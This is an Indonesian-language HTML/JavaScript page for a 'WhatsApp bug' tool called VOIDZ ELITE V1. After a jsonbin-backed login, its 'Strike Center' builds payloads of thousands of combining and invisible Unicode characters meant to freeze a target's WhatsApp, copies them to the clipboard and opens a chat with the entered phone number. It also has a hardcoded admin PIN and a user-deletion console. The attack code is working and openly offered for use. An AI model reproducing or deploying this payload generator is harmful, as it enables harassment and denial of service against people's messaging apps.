<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>VOIDZ ELITE V1 - FINAL SUPREME</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
    <style>
        :root { --fire: #ff4500; --neon-red: #ff0000; --bg: #000; --card: rgba(10, 0, 0, 0.98); }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'JetBrains Mono', monospace; -webkit-tap-highlight-color: transparent; }
        
        body { background: var(--bg); color: #fff; height: 100vh; width: 100vw; overflow: hidden; position: relative; }
        
        /* Layer 1: Background Partikel (Dibuat Klik-Tembus) */
        #ash-canvas { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; pointer-events: none; }

        /* Layer 2: Main UI (Di atas Partikel) */
        .content-layer { position: relative; z-index: 10; height: 100vh; display: flex; flex-direction: column; overflow: hidden; }
        .neon-red { color: var(--neon-red); text-shadow: 0 0 10px var(--neon-red), 0 0 20px var(--neon-red); font-family: 'Orbitron'; font-weight: 900; }
        
        /* LOGIN PAGE */
        #loginPage { flex: 1; display: flex; justify-content: center; align-items: center; z-index: 100; position: relative; }
        .login-box { 
            width: 85%; max-width: 320px; background: var(--card); border: 1px solid #222; 
            padding: 30px; border-radius: 15px; text-align: center; border-top: 3px solid var(--fire);
            box-shadow: 0 10px 50px rgba(0,0,0,1); position: relative; z-index: 110;
        }
        
        .profile-img { width: 85px; height: 85px; border-radius: 50%; border: 2px solid var(--fire); box-shadow: 0 0 15px var(--fire); margin-bottom: 20px; object-fit: cover; }
        .secret-title { font-size: 16px; margin-bottom: 20px; cursor: default; user-select: none; }

        /* TOMBOL UTAMA - PRIORITAS KLIK TERTINGGI */
        .btn-main { 
            width: 100%; background: var(--fire); color: #000; border: none; padding: 14px; 
            font-weight: 900; cursor: pointer; border-radius: 5px; font-family: 'Orbitron'; 
            margin-top: 10px; transition: 0.2s; position: relative; z-index: 200; pointer-events: auto; display: block;
        }
        .btn-main:active { transform: scale(0.95); opacity: 0.8; }
        
        .input-box { width: 100%; background: #080808; border: 1px solid #333; padding: 12px; color: #fff; margin-bottom: 10px; text-align: center; font-size: 11px; border-radius: 5px; outline: none; position: relative; z-index: 150; }

        /* DASHBOARD & TABS */
        .tab-content { display: none; padding: 15px; overflow-y: auto; height: 100%; padding-bottom: 100px; }
        .active-tab { display: block; }
        
        .bottom-nav { position: fixed; bottom: 0; width: 100%; background: #050505; border-top: 1px solid #222; display: none; height: 65px; z-index: 1000; }
        .nav-btn { display: flex; flex-direction: column; align-items: center; justify-content: center; color: #444; flex: 1; font-size: 8px; cursor: pointer; }
        .nav-btn.active { color: var(--fire); }

        .banner-container { grid-column: span 2; position: relative; width: 100%; height: 160px; border-radius: 12px; overflow: hidden; border: 1px solid var(--fire); margin-bottom: 5px; }
        .banner-img { width: 100%; height: 100%; object-fit: cover; }
        marquee { background: rgba(255, 69, 0, 0.05); color: var(--fire); font-size: 10px; padding: 5px 0; border-radius: 5px; margin-top: 5px; display: block; width: 100%; }
    </style>
</head>
<body>
    <canvas id="ash-canvas"></canvas>

    <div class="content-layer">
        <div id="loginPage">
            <div class="login-box">
                <img src="login.jpg" class="profile-img" onerror="this.src='https://api.dicebear.com/7.x/pixel-art/svg?seed=voidz'">
                <h2 class="neon-red secret-title" id="titleSecret" onclick="handleSecretClick()">VOIDZ ELITE V1</h2>
                
                <input type="text" id="lUser" class="input-box" placeholder="OPERATOR ID">
                <input type="password" id="lPass" class="input-box" placeholder="ACCESS KEY">
                <button type="button" onclick="auth()" class="btn-main" id="btnLog">IGNITE</button>

                <div style="margin-top: 20px; border-top: 1px solid #222; padding-top: 15px; display: flex; flex-direction: column; gap: 10px;">
                    <a href="javascript:void(0)" onclick="window.open(VOIDZ_CONFIG.linkSaluran)" style="text-decoration: none; color: #25d366; font-size: 9px; display: flex; align-items: center; justify-content: center; gap: 5px;"><i class="fab fa-whatsapp"></i> JOIN CHANNEL</a>
                    <a href="javascript:void(0)" onclick="window.open('https://wa.me/'+VOIDZ_CONFIG.adminWA)" style="text-decoration: none; color: #00e5ff; font-size: 9px; display: flex; align-items: center; justify-content: center; gap: 5px;"><i class="fas fa-user-shield"></i> CONTACT ADMIN</a>
                </div>
            </div>
        </div>

        <div id="mainApp" style="display:none; flex:1; overflow:hidden;">
            <div id="tabHOME" class="tab-content active-tab">
                <h2 class="neon-red" style="text-align:center; margin-top:20px; font-size: 18px;">DASHBOARD</h2>
                <div id="menuContainer" style="display:grid; grid-template-columns:1fr 1fr; gap:10px; margin-top:20px;"></div>
                <button class="btn-main" style="background:#111; color:#444; margin-top:30px;" onclick="location.reload()">LOGOUT SESSION</button>
            </div>
            
            <div id="tabATTACK" class="tab-content">
                <h2 class="neon-red" style="text-align:center; margin-top:20px;">STRIKE CENTER</h2>
                <div style="margin-top:20px; background:#050505; padding:20px; border-radius:10px; border:1px solid #222; border-top:2px solid var(--fire);">
                    <input type="text" id="targetBug" class="input-box" placeholder="Target 628xxx">
                    <select id="bugLevel" class="input-box">
                        <option value="LITE">LEVEL: LITE (Warning)</option>
                        <option value="FREEZE">LEVEL: FREEZE (3000 Chars)</option>
                        <option value="SUPREME">LEVEL: SUPREME (4000 Chars)</option>
                        <option value="ULTIMATE">LEVEL: ULTIMATE (5000+ Chars)</option>
                    </select>
                    <button class="btn-main" onclick="startAttack()">EXECUTE STRIKE</button>
                </div>
            </div>
        </div>

        <nav id="bottomNav" class="bottom-nav">
            <div class="nav-btn active" onclick="switchTab('home', this)"><i class="fas fa-home"></i><span>HOME</span></div>
            <div class="nav-btn" onclick="switchTab('attack', this)"><i class="fas fa-skull"></i><span>ATTACK</span></div>
        </nav>
    </div>

    <script>
        // CONFIG UTAMA
        const VOIDZ_CONFIG = {
            adminWA: "6285718241306",
            linkSaluran: "https://whatsapp.com/channel/0029VbC50wZInlqIFSnZVt0U",
            bannerHome: "dashboard.jpg",
            systemName: "VOIDZ ELITE V1",
            marqueeText: " [ STATUS: ONLINE ] ‚Äî [ SERVER: STABLE ] ‚Äî [ WELCOME OPERATOR ] ‚Äî [ USE WISELY ] "
        };

        // 1. ENGINE PARTIKEL (POINTER-EVENTS NONE)
        const canvas = document.getElementById('ash-canvas');
        const ctx = canvas.getContext('2d');
        let particles = [];
        function initCanvas() {
            canvas.width = window.innerWidth; canvas.height = window.innerHeight;
            particles = []; for(let i=0; i<60; i++) particles.push({ x: Math.random()*canvas.width, y: Math.random()*canvas.height, s: Math.random()*2, d: Math.random()*0.5+0.1 });
        }
        function animate() {
            ctx.clearRect(0,0,canvas.width,canvas.height); ctx.fillStyle = "rgba(255,255,255,0.2)";
            particles.forEach(p => { ctx.beginPath(); ctx.arc(p.x, p.y, p.s, 0, Math.PI*2); ctx.fill(); p.y -= p.d; if(p.y < 0) p.y = canvas.height; });
            requestAnimationFrame(animate);
        }
        window.addEventListener('resize', initCanvas); initCanvas(); animate();

        // 2. TRIPLE CLICK SECRET
        let clicks = 0, last = 0;
        function handleSecretClick() {
            const now = Date.now();
            if(now - last > 1000) clicks = 0;
            clicks++; last = now;
            if(clicks === 3) { clicks = 0; setupAPI(); }
        }

        let JB_KEY = localStorage.getItem('JB_KEY'), JB_BIN = localStorage.getItem('JB_BIN'), DB = {};
        function setupAPI() {
            if(prompt("ADMIN PIN:") === "2404") {
                let k = prompt("Master Key:"), b = prompt("Bin ID:");
                if(k && b) { localStorage.setItem('JB_KEY', k.trim()); localStorage.setItem('JB_BIN', b.trim()); alert("LINKED!"); location.reload(); }
            }
        }

        // 3. AUTH & DASHBOARD
        async function auth() {
            if(!JB_KEY || !JB_BIN) return alert("Klik judul 3x untuk setup!");
            const u = document.getElementById('lUser').value.trim(), p = document.getElementById('lPass').value.trim();
            if(!u || !p) return alert("Isi ID & Key!");
            const btn = document.getElementById('btnLog'); btn.innerText = "AUTHENTICATING...";
            try {
                const res = await fetch(`https://api.jsonbin.io/v3/b/${JB_BIN}/latest`, { headers: {'X-Master-Key': JB_KEY, 'X-Bin-Meta': false} });
                DB = await res.json();
                if(DB[u] && DB[u].pw === p) {
                    document.getElementById('loginPage').style.display = 'none';
                    document.getElementById('mainApp').style.display = 'block';
                    document.getElementById('bottomNav').style.display = 'flex';
                    renderHome(u, DB[u]);
                } else { alert("ACCESS DENIED!"); btn.innerText = "IGNITE"; }
            } catch(e) { alert("ERROR DATABASE!"); btn.innerText = "IGNITE"; }
        }

        function renderHome(id, data) {
            const isOwner = data.role.toLowerCase() === 'owner';
            document.getElementById('menuContainer').innerHTML = `
                <div class="banner-container">
                    <img src="${VOIDZ_CONFIG.bannerHome}" class="banner-img" onerror="this.src='https://images.unsplash.com/photo-1614850523296-d8c1af93d400?auto=format&fit=crop&w=1000&q=80'">
                    <div style="position: absolute; inset: 0; background: linear-gradient(transparent, rgba(0,0,0,0.9));"></div>
                    <div style="position: absolute; bottom: 10px; left: 15px;">
                        <div style="font-family: 'Orbitron'; font-size: 13px; color: #fff;">${VOIDZ_CONFIG.systemName}</div>
                        <div style="font-size: 8px; color: var(--fire);">OPERATOR: ${id.toUpperCase()}</div>
                    </div>
                </div>
                <marquee style="grid-column: span 2;">${VOIDZ_CONFIG.marqueeText}</marquee>
                
                ${isOwner ? `
                <div style="grid-column: span 2; background:#1a0000; border:1px solid #ff0000; padding:15px; border-radius:10px; margin-top:5px;">
                    <div style="font-size:9px; color:#ff0000; font-weight:bold; margin-bottom:10px;"><i class="fas fa-user-slash"></i> OWNER CONSOLE: DELETE USER</div>
                    <input type="text" id="targetDelete" class="input-box" placeholder="Input ID Member" style="border-color:#400; margin-bottom:5px;">
                    <button onclick="deleteUser()" class="btn-main" style="background:#ff0000; font-size:10px; padding:10px; margin-top:0;">BAN & DELETE USER</button>
                </div>
                ` : ''}

                <div style="background:#080808; padding:15px; border-radius:10px; border-left:4px solid var(--fire); grid-column: span 2; display:flex; justify-content:space-between; align-items:center; margin-top:5px;">
                    <div><div style="font-size:9px; color:#555;">ENCRYPTION</div><div style="font-size:12px; font-weight:900; color:var(--fire);">AES-256 BIT</div></div>
                    <i class="fas fa-fingerprint" style="color:#222; font-size:20px;"></i>
                </div>
                <div style="background:#080808; padding:15px; border-radius:10px; border:1px solid #222; text-align:center;">
                    <div style="font-size:9px; color:#555;">ROLE</div><div style="font-size:10px;">${data.role.toUpperCase()}</div>
                </div>
                <div style="background:#080808; padding:15px; border-radius:10px; border:1px solid #222; text-align:center;">
                    <div style="font-size:9px; color:#555;">QUOTA</div><div style="font-size:10px; color:#00ff00;">${data.quota || '‚àû'}</div>
                </div>`;
        }

        // 4. DELETE USER (ANTI-HAPUS OWNER)
        async function deleteUser() {
            const target = document.getElementById('targetDelete').value.trim();
            if(!target || !DB[target]) return alert("ID Tidak Valid!");
            if(target.toLowerCase() === 'owner' || DB[target].role.toLowerCase() === 'owner') return alert("TIDAK BISA HAPUS OWNER!");

            if(confirm("Hapus Akun "+target+"?")) {
                delete DB[target];
                try {
                    await fetch(`https://api.jsonbin.io/v3/b/${JB_BIN}`, {
                        method: 'PUT',
                        headers: {'Content-Type': 'application/json', 'X-Master-Key': JB_KEY},
                        body: JSON.stringify(DB)
                    });
                    alert("TERHAPUS!"); location.reload();
                } catch(e) { alert("Gagal Cloud!"); }
            }
        }

        function switchTab(t, el) {
            document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active-tab'));
            document.getElementById('tab'+t.toUpperCase()).classList.add('active-tab');
            document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
            el.classList.add('active');
        }

        // 5. ATTACK ENGINE (5000+ CHARS)
        function startAttack() {
            const t = document.getElementById('targetBug').value.trim(), level = document.getElementById('bugLevel').value;
            if(!t) return alert("Target!");
            let tc = t.replace(/\D/g, ''); if(tc.startsWith('0')) tc = '62' + tc.slice(1);
            
            let payload = "";
            if(level === "LITE") payload = "‚ö†Ô∏è WARNING ‚ö†Ô∏è\n".repeat(300);
            else if(level === "FREEZE") payload = "‚ùÑÔ∏è FREEZE ‚ùÑÔ∏è\n" + "“â".repeat(3000);
            else if(level === "SUPREME") payload = "üî• SUPREME üî•\n" + "‚Äè‚Äå‚Äç‚Äé".repeat(4000);
            else if(level === "ULTIMATE") payload = "üíÄ ULTIMATE üíÄ\n" + "“â".repeat(2500) + "Õè".repeat(3000);

            navigator.clipboard.writeText(payload).then(() => {
                alert("PAYLOAD " + level + " COPIED!");
                window.open(`https://wa.me/${tc}?text=${encodeURIComponent("‚ö†Ô∏è STRIKE INITIATED. PASTE PAYLOAD!")}`, '_blank');
            });
        }
    </script>
</body>
</html>
